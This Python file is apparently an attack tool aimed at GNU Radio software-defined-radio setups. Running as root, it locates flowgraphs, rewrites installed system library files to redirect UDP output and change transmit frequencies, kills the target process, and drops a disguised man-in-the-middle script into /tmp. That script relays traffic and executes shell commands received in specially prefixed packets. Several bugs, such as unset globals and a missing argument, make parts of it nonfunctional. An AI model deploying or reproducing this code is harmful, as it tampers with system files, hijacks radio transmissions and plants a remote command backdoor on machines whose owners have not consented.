import subprocess
import os,sys
import getpass

username=getpass.getuser()

udp_source_pid_list=[]
udp_source_pid_list_truncated=[]
PID=""
PATH=""

real_udp_source=0
real_udp_sink=0
attacker_udp_sink=50365

udp_sink_paclen=0

attacker_sink_freq='1500000000'
mitmscript=""

def mitm_script(): 
    mitmscript="""import socket
    import subprocess
    import os

    if os.path.exists("/tmp/config-err-P5f3YDS"):
      os.remove("/tmp/config-err-P5f3YDS")

    UDP_IP = "127.0.0.1"
    REAL_UDP_PORT_SINK = {0} 
    REAL_UDP_PORT_SOURCE = {1}
    FAKE_UDP_PORT = {2}
    PAYLOAD_SIZE = {3}

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    sock.bind((UDP_IP,FAKE_UDP_PORT))

    def cmd_exe(command,procinput=None):
        cmd=command.split(" ")
        result = subprocess.run(cmd, capture_output=True,text=True,input=procinput)
        return result

    while (True):
        try:
            data, addr = sock.recvfrom(PAYLOAD_SIZE)
            
            if data[0:3] == '%@#':
                result=cmd_exe(data[3:])
                        
                if result.stderr == "":
                    lines=(result.stdout).split("\n")
                    for line in lines:
                        sock.sendto(bytes("%@#"+line, "utf-8"), (UDP_IP,REAL_UDP_PORT_SOURCE))

                else:
                    lines=(result.stderr).split("\n")
                    for line in lines:
                        sock.sendto(bytes("%@#"+line, "utf-8"), (UDP_IP,REAL_UDP_PORT_SOURCE))
                            
            else:
                sock.sendto(bytes(data, "utf-8"), (UDP_IP,REAL_UDP_PORT_SINK))        	
        except socket.timeout:
            pass
    """.format(real_udp_sink,real_udp_source,attacker_udp_sink,udp_sink_paclen)

def cmd_exe(command,procinput=None):
    cmd=command.split(" ")
    
    result = subprocess.run(cmd, capture_output=True,text=True,input=procinput)
    return result

def get_pids_ports():
    global udp_source_pid_list,udp_source_pid_list_truncated  
    
    netstat_op = cmd_exe("netstat -l -v -n -p")
    udp_data = cmd_exe("grep udp",netstat_op.stdout)
    udp_data_python = cmd_exe("grep python",udp_data.stdout)

    udp_data_split=(udp_data_python.stdout).split("\n")

    
    for line in udp_data_split:
        flag=0
        
        dat=line.split(" ")
        proc_dat=(line.split("/")[0])
        for bit in dat:
            if ":" in bit:
                udp_source_pid_list.append(proc_dat[proc_dat.rindex(" ")+1:len(proc_dat)])
                flag=1
                
            if flag:
                break
    
    udp_source_pid_list_truncated=list(set(udp_source_pid_list))

def get_program_path(pid):
    prog_path=""
    ps_data=cmd_exe("ps -e -f -q "+pid)
    ps_data_split=(ps_data.stdout).split("\n")

    prog_nameorpath=(ps_data_split[1].split(" "))[-1]

    ps_dir=cmd_exe("pwdx "+pid)
    ps_dir_path=((ps_dir.stdout).split(" ")[1])[:-1]

    if ps_dir_path in prog_nameorpath:
        prog_path=prog_nameorpath

    else:
        prog_path=ps_dir_path+"/"+prog_nameorpath

    return prog_path
        
    
def check_prog_data(path):
    flag=[0,0,0,0,0]
    f = open(path,'r')
    count = 0
     
    while True:
        count += 1
     
        # Get next line from file
        line = f.readline()
             
        # if line is empty
        # end of file is reached
        if not line:
            break
        trunc_line=line[:-1].rstrip()

        if "self.blocks_udp_source_0 = blocks.udp_source" in trunc_line:
            flag[0]=1
            real_udp_source=(line.split(" ")[-3])[:-1]

        elif "self.blocks_udp_sink_0 = blocks.udp_sink" in trunc_line:
            flag[1]=1
            real_udp_sink=(line.split(" ")[-3])[:-1]
            udp_sink_paclen=(line.split(" ")[-2])[:-1]        

        elif "self.uhd_usrp_sink_0 = uhd.usrp_sink" in trunc_line:
            flag[2]=1

        elif "self.limesdr_sink_0 = limesdr.sink" in trunc_line:
            flag[3]=1

        elif "self.osmosdr_sink_0 = osmosdr.sink" in trunc_line:
            flag[4]=1

    f.close()
    
    if (flag[0]==1) and (flag[1]==1) and (sum(flag) > 2):   
        return True,flag
    else:
        return False,flag

def infect_udp_files(filepath):
    
    f = open(filepath,'r')
    data=f.readlines()
    f.close()

    open(filepath, 'w').close()

    f = open(filepath,'a')

    for line in data:
        if ("_blocks_swig6.udp_sink_make" in line) or ("_blocks_swig6.udp_sink_connect" in line):
            line=line.replace("port",str(attacker_udp_sink))
        
        f.write(line)
    f.close()
    
def infect_osmo_sink_files(filepath):
    f = open(filepath,'r')
    data=f.readlines()
    f.close()

    open(filepath, 'w').close()

    f = open(filepath,'a')
        
    for line in data:
        if ("_osmosdr_swig.sink_set_center_freq" in line):
            line=line.replace("freq", attacker_sink_freq)
            
        f.write(line)
    f.close()

def infect_lime_sink_files(filepath):
    f = open(filepath,'r')
    data=f.readlines()
    f.close()

    open(filepath, 'w').close()

    f = open(filepath,'a')
        
    for line in data:
        if ("_limesdr_swig.sink_set_center_freq" in line):
            line=line.replace("freq", attacker_sink_freq)
            
        f.write(line)
    f.close()

def infect_ursp_sink_files(filepath):
    f = open(filepath,'r')
    data=f.readlines()
    f.close()

    open(filepath, 'w').close()

    f = open(filepath,'a')
        
    for line in data:
        if ("_uhd_swig.usrp_sink_set_lo_freq" in line):
            line=line.replace("freq", attacker_sink_freq)
            
        f.write(line)
    f.close()

def kill_target_proc():
    cmd_exe("kill -9 "+PID)
    
def launch_mitm_udp_script(path):
    mitm_script()
    f = open(path,"w")
    f.write(mitmscript)
    f.close()

    process = subprocess.Popen(["python3",path])

def relaunch_target_proc(path):
    subprocess.Popen(["python3",path])
        
def main():
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exit")

    flags=[]
    get_pids_ports()

    print(udp_source_pid_list_truncated)
    
    for pid in udp_source_pid_list_truncated:
        path=get_program_path(pid)
        opt,flag=check_prog_data(path)
        flags=flag
        if opt:
            PID=pid
            PATH=path
            break
        

    infect_udp_files('/usr/lib/python3/dist-packages/gnuradio/blocks/blocks_swig6.py')

    if flags[2]:
        infect_ursp_sink_files("/usr/lib/python3/dist-packages/gnuradio/uhd/uhd_swig.py")
        
    if flags[3]:
        infect_lime_sink_files("/usr/lib/python3/dist-packages/limesdr/limesdr_swig.py")
               
    if flags[4]:
        infect_osmo_sink_files("/usr/lib/python3/dist-packages/osmosdr/osmosdr_swig.py")
            
    kill_target_proc()
    launch_mitm_udp_script("/tmp/config-err-P5f3YDS")
    relaunch_target_proc()
    
main()
